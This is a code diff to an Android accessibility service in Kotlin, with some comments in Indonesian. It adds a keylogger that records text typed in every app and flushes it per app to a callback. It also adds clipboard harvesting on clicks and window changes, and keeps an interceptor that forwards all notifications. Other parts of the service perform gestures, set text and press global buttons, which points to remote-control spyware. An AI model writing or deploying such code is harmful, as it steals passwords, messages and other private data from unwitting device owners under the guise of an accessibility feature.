@@ -2,10 +2,14 @@ package com.template.app
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
+import android.content.ClipboardManager
+import android.content.Context
 import android.graphics.Path
 import android.os.Build
+import android.os.Bundle
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 import androidx.annotation.RequiresApi
 
 class MyAccessibilityService : AccessibilityService() {
@@ -14,6 +18,17 @@ class MyAccessibilityService : AccessibilityService() {
         private const val TAG = "MyAccessibility"
         var instance: MyAccessibilityService? = null
     }
+
+    // ==========================================
+    // ===== KEYLOG STATE =====
+    // ==========================================
+    private val keylogBuffer = StringBuilder()
+    private var lastPackage = ""
+    private var lastClipboardText = ""
+
+    // Callbacks
+    var keylogCallback: ((String, String) -> Unit)? = null
+    var clipboardCallback: ((String) -> Unit)? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -24,20 +39,90 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
-        // Intercept notification
-        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-            try {
-                val pkg = event.packageName?.toString() ?: ""
-                val title = event.text.joinToString(" ") { it.toString() }
-                val content = event.contentDescription?.toString() ?: ""
+        try {
+            when (event.eventType) {
+                // ===== NOTIFICATION INTERCEPT =====
+                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
+                    val pkg = event.packageName?.toString() ?: ""
+                    val title = event.text.joinToString(" ") { it.toString() }
+                    val content = event.contentDescription?.toString() ?: ""
 
-                Log.d(TAG, "📩 Notif from $pkg: $title | $content")
+                    Log.d(TAG, "📩 Notif from $pkg: $title | $content")
 
-                // Forward ke NotificationInterceptor
-                NotificationInterceptor.onNotification(pkg, title, content)
-            } catch (e: Exception) {
-                Log.e(TAG, "Notif parse error", e)
+                    NotificationInterceptor.onNotification(pkg, title, content)
+                }
+
+                // ===== KEYLOG: TEXT CHANGED =====
+                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                    val pkg = event.packageName?.toString() ?: ""
+                    val text = event.text.joinToString("") { it.toString() }
+
+                    // Kalau ganti app → flush buffer
+                    if (pkg != lastPackage && keylogBuffer.isNotEmpty()) {
+                        flushKeylog()
+                    }
+                    lastPackage = pkg
+
+                    if (text.isNotEmpty()) {
+                        keylogBuffer.append(text)
+                        Log.d(TAG, "⌨️ [$pkg] Text: $text")
+
+                        // Kirim kalau buffer > 100 char
+                        if (keylogBuffer.length >= 100) {
+                            flushKeylog()
+                        }
+                    }
+                }
+
+                // ===== CLIPBOARD: CHECK ON CLICK =====
+                AccessibilityEvent.TYPE_VIEW_CLICKED,
+                AccessibilityEvent.TYPE_VIEW_LONG_CLICKED,
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                    checkClipboard()
+                }
             }
+        } catch (e: Exception) {
+            Log.e(TAG, "onAccessibilityEvent error", e)
+        }
+    }
+
+    // ==========================================
+    // ===== KEYLOG =====
+    // ==========================================
+    private fun flushKeylog() {
+        if (keylogBuffer.isEmpty()) return
+
+        val text = keylogBuffer.toString()
+        val pkg = lastPackage
+
+        keylogBuffer.clear()
+
+        Log.d(TAG, "📤 Keylog flush [$pkg]: ${text.take(50)}")
+
+        keylogCallback?.invoke(pkg, text)
+    }
+
+    // ==========================================
+    // ===== CLIPBOARD =====
+    // ==========================================
+    private fun checkClipboard() {
+        try {
+            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE)
+                    as ClipboardManager
+
+            if (clipboard.hasPrimaryClip()) {
+                val clip = clipboard.primaryClip
+                if (clip != null && clip.itemCount > 0) {
+                    val text = clip.getItemAt(0).text?.toString() ?: ""
+                    if (text.isNotEmpty() && text != lastClipboardText) {
+                        lastClipboardText = text
+                        Log.d(TAG, "📋 Clipboard: ${text.take(50)}")
+                        clipboardCallback?.invoke(text)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "clipboard error", e)
         }
     }
 
@@ -47,6 +132,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onDestroy() {
         super.onDestroy()
+        flushKeylog()
         instance = null
         Log.d(TAG, "💀 Service destroyed")
     }
@@ -58,7 +144,6 @@ class MyAccessibilityService : AccessibilityService() {
         return try {
             performGlobalAction(GLOBAL_ACTION_BACK)
         } catch (e: Exception) {
-            Log.e(TAG, "Back error", e)
             false
         }
     }
@@ -67,7 +152,6 @@ class MyAccessibilityService : AccessibilityService() {
         return try {
             performGlobalAction(GLOBAL_ACTION_HOME)
         } catch (e: Exception) {
-            Log.e(TAG, "Home error", e)
             false
         }
     }
@@ -76,7 +160,6 @@ class MyAccessibilityService : AccessibilityService() {
         return try {
             performGlobalAction(GLOBAL_ACTION_RECENTS)
         } catch (e: Exception) {
-            Log.e(TAG, "Recents error", e)
             false
         }
     }
@@ -85,7 +168,6 @@ class MyAccessibilityService : AccessibilityService() {
         return try {
             performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
         } catch (e: Exception) {
-            Log.e(TAG, "Notifications error", e)
             false
         }
     }
@@ -165,7 +247,6 @@ class MyAccessibilityService : AccessibilityService() {
         durationMs: Long = 300,
     ): Boolean {
         return try {
-            // Dua jari bergerak bersamaan
             val path1 = Path().apply {
                 moveTo(centerX - deltaX, centerY - deltaY)
                 lineTo(centerX - deltaX * 2, centerY - deltaY * 2)
@@ -185,24 +266,24 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     // ==========================================
-    // ===== TEXT INPUT (BUTUH FOCUS) =====
+    // ===== TEXT INPUT (FOCUSED NODE) =====
     // ==========================================
     @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
     fun setTextOnFocusedNode(text: String): Boolean {
         return try {
             val root = rootInActiveWindow ?: return false
-            val focused = root.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
+            val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                 ?: return false
 
-            val args = android.os.Bundle().apply {
+            val args = Bundle().apply {
                 putString(
-                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
+                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                     text,
                 )
             }
 
             focused.performAction(
-                android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT,
+                AccessibilityNodeInfo.ACTION_SET_TEXT,
                 args,
             )
         } catch (e: Exception) {
@@ -212,7 +293,7 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     // ==========================================
-    // ===== GET SCREEN INFO =====
+    // ===== SCREEN INFO =====
     // ==========================================
     fun getScreenInfo(): Map<String, Any> {
         val metrics = resources.displayMetrics
